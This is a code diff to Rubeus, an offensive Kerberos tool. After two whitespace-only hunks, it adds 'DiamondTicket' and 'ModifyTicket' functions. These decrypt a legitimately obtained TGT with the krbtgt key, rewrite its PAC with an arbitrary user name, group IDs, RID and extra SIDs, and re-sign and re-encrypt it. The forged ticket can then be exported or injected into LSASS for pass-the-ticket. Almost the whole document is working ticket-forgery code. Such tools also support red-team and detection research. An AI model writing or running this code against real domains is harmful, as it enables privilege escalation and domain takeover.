@@ -396,7 +396,7 @@ namespace Rubeus
                                         maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);
                                         if (maxPassAge > 0)
                                         {
-                                           DateTime pwdLastReset = (DateTime)userObject["pwdlastset"];
+                                            DateTime pwdLastReset = (DateTime)userObject["pwdlastset"];
                                             if (pwdLastReset == DateTime.MinValue)
                                             {
                                                 DateTime dt = DateTime.Now;
@@ -479,7 +479,7 @@ namespace Rubeus
                     {
                         kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);
                     }
-                    
+
                     if (userObject.ContainsKey("lastlogoff") && ((DateTime)userObject["lastlogoff"] != DateTime.MinValue))
                     {
                         kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);
@@ -1161,6 +1161,272 @@ namespace Rubeus
                 // print the command
                 Console.WriteLine("\r\n[*] Printing a command to recreate a ticket containing the information used within this ticket\r\n\r\n{0}\r\n", cmdOut);
             }
+        }
+
+        public static byte[] DiamondTicket(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        {
+            byte[] tgtBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, luid, false, true);
+            
+            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
+        }
+
+        public static byte[] DiamondTicket(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        {
+            byte[] tgtBytes = Ask.TGT(userName, domain, certFile, certPass, etype, null, false, domainController);
+            
+            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
+        }
+
+        public static byte[] ModifyTicket(KRB_CRED kirbi, string serviceKey, string krbKey = "", string outfile = "", bool ptt = false, LUID luid = new LUID(), string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        {
+            Console.WriteLine();
+            if (String.IsNullOrEmpty(krbKey))
+            {
+                krbKey = serviceKey;
+            }
+
+            EncTicketPart decryptedEncTicket = null;
+            PACTYPE pt = null;
+            Ticket ticket = null;
+            try
+            {
+                ticket = kirbi.tickets[0];
+                Console.WriteLine("[*] Decrypting TGT");
+                decryptedEncTicket = ticket.Decrypt(Helpers.StringToByteArray(serviceKey), null);
+                Console.WriteLine("[*] Retreiving PAC");
+                pt = decryptedEncTicket.GetPac(null);
+            }
+            catch
+            {
+                Console.WriteLine("[X] Unable to decrypt ticket or get PAC!");
+                return null;
+            }
+
+            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
+            ClientName cn = null;
+            UpnDns upnDns = null;
+            Attributes attrib = null;
+            Requestor requestor = null;
+            SignatureData svrSigData = null;
+            SignatureData kdcSigData = null;
+
+            Console.WriteLine("[*] Modifying PAC");
+            foreach (var pacInfoBuffer in pt.PacInfoBuffers)
+            {
+                if (pacInfoBuffer is LogonInfo linfo)
+                {
+                    kvi = linfo.KerbValidationInfo;
+
+                    if (!String.IsNullOrEmpty(ticketUser))
+                    {
+                        kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(ticketUser);
+                    }
+
+                    if (!String.IsNullOrEmpty(groups))
+                    {
+                        int groupCount = groups.Split(',').Length;
+                        kvi.GroupCount = groupCount;
+                        kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[groupCount];
+
+                        int c = 0;
+                        foreach (string gid in groups.Split(','))
+                        {
+                            Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
+                            c += 1;
+                        }
+                    }
+                    if (ticketUserId > 0)
+                    {
+                        kvi.UserId = ticketUserId;
+                    }
+
+                    if (!String.IsNullOrEmpty(sids))
+                    {
+                        int numOfSids = sids.Split(',').Length;
+                        kvi.SidCount = numOfSids;
+                        kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
+                        int c = 0;
+                        foreach (string s in sids.Split(','))
+                        {
+                            Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ExtraSids, c, 1);
+                            c += 1;
+                        }
+                    }
+                }
+                else if (pacInfoBuffer is ClientName temp)
+                {
+                    cn = temp;
+                    if (!String.IsNullOrEmpty(ticketUser))
+                    {
+                        cn = new ClientName(cn.ClientId,ticketUser);
+                    }
+                }
+                else if (pacInfoBuffer is UpnDns temp2)
+                {
+                    upnDns = temp2;
+                    if (!String.IsNullOrEmpty(ticketUser))
+                    {
+                        string samName = null;
+                        SecurityIdentifier sid = null;
+                        if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
+                        {
+                            samName = upnDns.SamName;
+                            if (!string.IsNullOrWhiteSpace(ticketUser))
+                            {
+                                samName = ticketUser;
+                            }
+                            sid = upnDns.Sid;
+                            if (ticketUserId > 0)
+                            {
+                                sid = new SecurityIdentifier(String.Format("{0}-{1}", sid.Value.Substring(0, sid.Value.LastIndexOf('-')), ticketUserId));
+                            }
+                        }
+                        upnDns = new UpnDns((int)upnDns.Flags,upnDns.DnsDomainName,string.Format("{0}@{1}", ticketUser, upnDns.DnsDomainName.ToLower()), samName, sid);
+
+                    }
+                }
+                else if (pacInfoBuffer is Attributes temp3)
+                {
+                    attrib = temp3;
+                }
+                else if (pacInfoBuffer is Requestor temp4)
+                {
+                    requestor = temp4;
+                    if (ticketUserId > 0)
+                    {
+                        requestor = new Requestor(String.Format("{0}-{1}", requestor.RequestorSID.Value.Substring(0,requestor.RequestorSID.Value.LastIndexOf('-')), ticketUserId));
+                    }
+                }
+                else if (pacInfoBuffer is SignatureData sigData)
+                {
+                    if (sigData.Type == PacInfoBufferType.KDCChecksum)
+                    {
+                        kdcSigData = sigData;
+                    }
+                    else if(sigData.Type == PacInfoBufferType.ServerChecksum)
+                    {
+                        svrSigData = sigData;
+                    }
+                }
+            }
+            int svrSigLength = 12;
+            int kdcSigLength = 12;
+            if (svrSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
+                svrSigLength = 16;
+            if (kdcSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
+                kdcSigLength = 16;
+            Console.WriteLine("[*] Signing PAC");
+            svrSigData.Signature = new byte[svrSigLength];
+            kdcSigData.Signature = new byte[kdcSigLength];
+            Array.Clear(svrSigData.Signature, 0, svrSigLength);
+            Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
+
+            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
+            LogonInfo li = new LogonInfo(kvi);
+            PacInfoBuffers.Add(li);
+            if (cn != null)
+            {
+                PacInfoBuffers.Add(cn);
+            }
+            if (upnDns != null)
+            {
+                PacInfoBuffers.Add(upnDns);
+            }
+            if (attrib != null)
+            {
+                PacInfoBuffers.Add(attrib);              
+            }
+            if (requestor != null)
+            {
+                PacInfoBuffers.Add(requestor);
+            }
+            PacInfoBuffers.Add(svrSigData);
+            PacInfoBuffers.Add(kdcSigData);
+            PACTYPE newPT = new PACTYPE(0, PacInfoBuffers);
+            byte[] ptBytes = newPT.Encode();
+            byte[] svrSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(serviceKey), ptBytes, svrSigData.SignatureType);
+            byte[] kdcSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(krbKey), svrSig, kdcSigData.SignatureType);
+            svrSigData.Signature = svrSig;
+            kdcSigData.Signature = kdcSig;
+            PacInfoBuffers = new List<PacInfoBuffer>();
+            PacInfoBuffers.Add(li);
+            if (cn != null)
+            {
+                PacInfoBuffers.Add(cn);
+            }
+            if (upnDns != null)
+            {
+                PacInfoBuffers.Add(upnDns);
+            }
+            if (attrib != null)
+            {
+                PacInfoBuffers.Add(attrib);
+            }
+            if (requestor != null)
+            {
+                PacInfoBuffers.Add(requestor);
+            }
+            PacInfoBuffers.Add(svrSigData);
+            PacInfoBuffers.Add(kdcSigData);
+            newPT = new PACTYPE(0, PacInfoBuffers);
+
+            if (!string.IsNullOrEmpty(ticketUser))
+            {
+                decryptedEncTicket.cname = new PrincipalName(ticketUser);
+                kirbi.enc_part.ticket_info[0].pname = new PrincipalName(ticketUser);
+            }
+
+            decryptedEncTicket.SetPac(newPT);
+            Console.WriteLine("[*] Encrypting Modified TGT");
+            byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, Helpers.StringToByteArray(serviceKey), decryptedEncTicket.Encode().Encode());
+            EncryptedData enc_part = new EncryptedData(ticket.enc_part.etype, encTicketPart, 3);
+            ticket.enc_part = enc_part;
+            kirbi.tickets[0] = ticket;
+
+            byte[] kirbiBytes = kirbi.Encode().Encode();
+
+            string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+            Console.WriteLine("");
+
+            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
+
+            if (Program.wrapTickets)
+            {
+                // display the .kirbi base64, columns of 80 chararacters
+                foreach (string line in Helpers.Split(kirbiString, 80))
+                {
+                    Console.WriteLine("      {0}", line);
+                }
+            }
+            else
+            {
+                Console.WriteLine("      {0}", kirbiString);
+            }
+
+            Console.WriteLine("");
+
+            if (!String.IsNullOrEmpty(outfile))
+            {
+                KrbCredInfo info = kirbi.enc_part.ticket_info[0];
+                DateTime fileTime = (DateTime)info.starttime;
+                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
+                filename = Helpers.MakeValidFileName(filename);
+                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                {
+                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                }
+            }
+
+            Console.WriteLine("");
+
+            if (ptt || ((ulong)luid != 0))
+            {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, luid);
+            }
+
+            return kirbiBytes;
         }
     }
 }
